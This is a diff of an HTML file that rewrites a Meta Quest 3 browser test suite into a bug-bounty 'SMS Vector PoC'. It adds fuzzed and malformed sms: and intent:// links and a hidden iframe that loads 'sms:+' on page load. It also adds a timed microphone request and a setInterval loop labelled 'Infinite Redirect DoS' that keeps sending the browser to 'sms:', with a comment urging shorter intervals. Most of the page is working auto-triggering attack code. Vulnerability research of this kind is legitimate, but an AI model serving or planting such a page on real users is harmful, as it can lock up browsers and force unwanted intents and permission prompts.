@@ -1,132 +1,55 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Meta Quest 3 Bug Bounty Test Suite</title>
+  <title>Meta Quest 3 SMS Vector PoC</title>
   <style>
     body { font-family: sans-serif; padding: 2rem; background: #f9f9f9; }
     h1, h2 { color: #111; }
     code { background: #eee; padding: 0.2em 0.4em; }
-    .section { margin-bottom: 2rem; }
     .log { white-space: pre-wrap; font-size: 0.9em; background: #f0f0f0; padding: 1em; border-radius: 6px; }
   </style>
 </head>
 <body>
-  <h1>Meta Quest 3 Cross-Account Test Suite</h1>
+  <h1>Meta Quest 3 Bug Bounty: SMS Vector PoC</h1>
 
-  <div class="section">
-    <h2>1. Storage Tests (localStorage & IndexedDB)</h2>
-    <button onclick="runStorageTests()">Run Storage Test</button>
-    <div class="log" id="storageLog"></div>
-  </div>
+  <h2>1. Basic sms:// Links</h2>
+  <p>
+    <a href="sms:1234567890">sms:1234567890 (standard)</a><br>
+    <a href="sms:">sms: (empty)</a><br>
+    <a href="sms:+">sms:+ (malformed)</a><br>
+    <a href="sms:00000000000000000000000000000000000000">sms: long number</a><br>
+    <a href="intent://sms/1234567890#Intent;scheme=sms;package=com.whatsapp;end">intent:// to WhatsApp</a>
+  </p>
 
-  <div class="section">
-    <h2>2. Service Worker Registration</h2>
-    <button onclick="registerSW()">Register Service Worker</button>
-    <div class="log" id="swLog"></div>
-  </div>
+  <h2>2. Auto-Trigger via iframe</h2>
+  <iframe src="sms:+" style="display:none;"></iframe>
 
-  <div class="section">
-    <h2>3. WebXR Session Request</h2>
-    <button onclick="requestXR()">Try XR Session</button>
-    <div class="log" id="xrLog"></div>
-  </div>
-
-  <div class="section">
-    <h2>4. getUserMedia (Microphone)</h2>
-    <button onclick="requestMic()">Request Microphone</button>
-    <div class="log" id="mediaLog"></div>
-  </div>
-
-  <div class="section">
-    <h2>5. Intent-Based Link Tests (Including Fuzzed SMS Links)</h2>
-    <p>
-      <a href="tel:1234567890">tel:1234567890</a><br>
-      <a href="sms:1234567890">sms:1234567890 (normal)</a><br>
-      <a href="sms:">sms: (empty)</a><br>
-      <a href="sms:+">sms:+ (malformed)</a><br>
-      <a href="sms:00000000000000000000000000000000000000">sms: long number</a><br>
-      <a href="intent://sms/1234567890#Intent;scheme=sms;package=com.whatsapp;end">intent:// to WhatsApp</a>
-    </p>
-  </div>
-
-  <div class="section">
-    <h2>6. File Picker Test</h2>
-    <input type="file" />
-  </div>
-
-  <div class="section">
-    <h2>7. Browser Info / Fingerprint</h2>
-    <div class="log" id="uaLog"></div>
-  </div>
-
+  <h2>3. Timed Trigger with getUserMedia</h2>
   <script>
-    // 1. Storage Test
-    function runStorageTests() {
-      const storageLog = document.getElementById("storageLog");
-      localStorage.setItem("crossAccountTest", "AccountA");
-      storageLog.textContent = "localStorage set: crossAccountTest = AccountA";
-
-      let dbRequest = indexedDB.open("crossAccountDB", 1);
-      dbRequest.onupgradeneeded = function(event) {
-        let db = event.target.result;
-        db.createObjectStore("tokens", { keyPath: "id" });
-      };
-      dbRequest.onsuccess = function(event) {
-        let db = event.target.result;
-        let tx = db.transaction("tokens", "readwrite");
-        let store = tx.objectStore("tokens");
-        store.put({ id: "mainToken", value: "fromAccountA" });
-        storageLog.textContent += "\nIndexedDB: token written.";
-      };
-    }
-
-    // 2. Service Worker
-    async function registerSW() {
-      const swLog = document.getElementById("swLog");
-      if ("serviceWorker" in navigator) {
-        try {
-          const reg = await navigator.serviceWorker.register("sw.js");
-          swLog.textContent = "Service Worker registered: " + reg.scope;
-        } catch (err) {
-          swLog.textContent = "Service Worker registration failed: " + err;
-        }
-      } else {
-        swLog.textContent = "Service Workers not supported.";
-      }
-    }
-
-    // 3. WebXR
-    async function requestXR() {
-      const xrLog = document.getElementById("xrLog");
-      if (navigator.xr) {
-        try {
-          const supported = await navigator.xr.isSessionSupported("immersive-vr");
-          if (!supported) return xrLog.textContent = "immersive-vr not supported.";
-          const session = await navigator.xr.requestSession("immersive-vr");
-          xrLog.textContent = "XR session started.";
-          session.end();
-        } catch (err) {
-          xrLog.textContent = "XR request failed: " + err;
-        }
-      } else {
-        xrLog.textContent = "WebXR not supported.";
-      }
-    }
-
-    // 4. Microphone Access
-    async function requestMic() {
-      const mediaLog = document.getElementById("mediaLog");
+    setTimeout(() => {
       try {
-        await navigator.mediaDevices.getUserMedia({ audio: true });
-        mediaLog.textContent = "Microphone access granted.";
-      } catch (err) {
-        mediaLog.textContent = "Microphone access denied: " + err;
+        navigator.mediaDevices.getUserMedia({ audio: true });
+      } catch (e) {
+        console.error("Media request failed", e);
       }
-    }
-
-    // 7. UA Display
-    document.getElementById("uaLog").textContent = navigator.userAgent;
+    }, 1500);
   </script>
+
+  <h2>4. Infinite Redirect DoS</h2>
+  <script>
+    setInterval(() => {
+      location.href = 'sms:';
+    }, 10000); // Change to 2000 for aggressive testing
+  </script>
+
+  <h2>5. File Picker After Intent</h2>
+  <a href="sms:">Trigger SMS</a><br>
+  <input type="file" />
+
+  <h2>6. Browser Info</h2>
+  <pre id="ua"></pre>
+  <script>document.getElementById("ua").textContent = navigator.userAgent;</script>
 </body>
 </html>
